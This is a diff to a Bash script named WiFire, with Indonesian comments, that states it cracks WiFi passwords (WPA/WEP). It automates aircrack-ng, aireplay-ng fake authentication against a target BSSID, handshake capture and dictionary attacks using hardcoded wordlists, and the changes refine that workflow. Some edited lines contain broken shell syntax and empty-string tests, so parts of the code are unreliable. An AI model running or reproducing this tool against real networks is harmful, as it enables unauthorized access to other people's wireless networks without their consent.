@@ -9,7 +9,7 @@
 # Variabel dasar
             mode="crack"                                       # AirCrack
        interface="wlan0"                                       # Default
-           versi="0.1"                                         # Versi
+           versi="0.1 RC2"                                     # Versi
 monitorInterface="mon0"                                        # Default
            bssid=""                                            # null
            essid=""                                            # null
@@ -102,6 +102,7 @@ cariClient () {
    fi
 }
 
+# Tampil
 function tampil() {
    error="free"
    if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Inisialisasi kode error
@@ -157,6 +158,9 @@ if [ "$debug" != "true" ] ; then
    if [ -e "/tmp/WiFire.dic" ] ; then command="$command /tmp/WiFire.dic" ; fi
    if [ ! -z "$command" ] ; then aksi "Menghapus file temporer" "rm -rfv $command" "true" ; fi
 fi
+if [ -e "/etc/init.d/network-manager" ]; then
+aksi "Mengembalikan Network Manager" "/etc/init.d/network-manager start" "true"
+fi
 echo -e "\e[01;34m[*]\e[00m Are you \e[01;36mblusp10it?\e[00m"
 exit 0
 }
@@ -167,32 +171,20 @@ tampil info "(C)opyright blusp10it"
 tampil info "Skrip ini berfungsi untuk melakukan cracking WiFi password (WPA/WEP)"
 #========================================================================================================================
 # Memilih Wordlist
-dir="/pentest/passwords/wordlists/"
+dir="/pentest/passwords/wordlists"
 ls $dir >> /tmp/WiFire.dic
-arrayDic=( $(cat /tmp/WiFire.dic) )
-dic=""
-id=""
-index="0"
-for item in "${arrayDic[@]}"; do
-        if [ "$dic" ] && [ "$dic" == "$item" ] ; then id="$index" ; fi
-        index=$(($index+1))
-done
-echo -e "Berikut adalah daftar wordlist kamu:"
-loop=${#arrayDic[@]}
-echo -e " Num |  Nama Dictionary   \n-----|------------------- "
-for (( i=0;i<$loop;i++)); do
-   printf '  %-3s| %-12s \n' "$(($i+1))" "${arrayDic[${i}]}"
-   printf ' %-3s %-12s\n' "$(($i+1))" "${arrayDic[${i}]}" >> /tmp/WiFire.lst
-done
-echo -e "-------------------------"
-echo -en "Pilih wordlist: "
-read num
-choice=$(cat /tmp/WiFire.lst | grep -w "$num" | awk '{print $2}')
-echo "Wordlist yang terpilih: $dir$choice"
-# Set WordList
-wordlist="$dir$choice"
+if [ -e "$dir/darkc0de.lst" ]; then
+     wordlist="$dir/darkc0de.lst"
+elif [ -e "$dir/wpa.txt" ]; then
+     wordlist="$dir/wpa.txt"
+else
+     echo -e "Tidak ada wordlist di directory $dir!!!"
+     exit
+fi
+tampil info "Wordlist=$wordlist"
 #========================================================================================================================
 tampil aksi "Menganalisa keadaan"
+aksi "Mempersiapkan airmon-ng" "airmon-ng check kill" "true"
 #========================================================================================================================
 # Are you ROOT?
 if [ "$(id -u)" != "0" ] ; then tampil error "Jalankan script ini sebagai root." 1>&2 ; cleanup nonuser; fi
@@ -351,15 +343,15 @@ if [ "$mode" == "crack" ] ; then
       if [ "$client" == "$mac" ] ; then sleep 20 && aksi "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 0 -e \"$essid\" -a $bssid -h $fakeMac $monitorInterface" "true" ; fi
       sleep 60
 #========================================================================================================================
-# ENKRIPSI WPA
+# ENKRIPSI WPA 
    elif [ "$encryption" == "WPA" ] ; then
       tampil aksi "Capturing: Handshake" 
       loop="0" # 0 = first, 1 = client, 2 = everyone
       echo "blusp10it" > /tmp/WiFire.tmp
-      for (( ; ; )) ; do
-         aksi "aircrack-ng" "aircrack-ng /tmp/WiFire*.cap -w /tmp/WiFire.tmp -e \"$essid\" > /tmp/WiFire.handshake"   "true"
+      for (( i ; ; )) ; do
+         aksi "aircrack-ng" "aircrack-ng /tmp/WiFire*.cap -w /tmp/WiFire.tmp -e \"$essid\" > /tmp/WiFire.handshake" "true"
          command=$(cat /tmp/WiFire.handshake | grep "Passphrase not in dictionary")
-         if [ "$command" ] ; then break; fi
+         if [ "$command" ] ; then break; fi 
          sleep 3
          if [ "$loop" != "1" ] ; then
             if [ "$loop" != "0" ] ; then cariClient $encryption ; fi
@@ -374,7 +366,7 @@ if [ "$mode" == "crack" ] ; then
          fi
          sleep 1
       done
-      if [ "" != "0" ] || [ "" == "true" ] || [ "$debug" == "true" ] ; then tampil aksi "Captured: Handshake"  ; fi
+      if [ "" != "0" ] || [ "" == "true" ] ; then tampil aksi "Captured: Handshake"  ; fi
       aksi "Menutup semua proses" "killall xterm && sleep 3" "true"
    fi
 #========================================================================================================================
@@ -411,7 +403,7 @@ if [ "$mode" == "crack" ] ; then
             fi
          sleep 5
          aksi "dhclient" "dhclient $interface" "true"
-         if [ "" != "0" ] || [ "" == "true" ] || [ "$debug" == "true" ] ; then
+         if [ "" != "0" ] || [ "" == "true" ] == "true" ] ; then
             ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
             tampil info "IP: $ourIP" 
             gateway=$(route -n | grep $interface | awk '/^0.0.0.0/ {getline; print $2}')
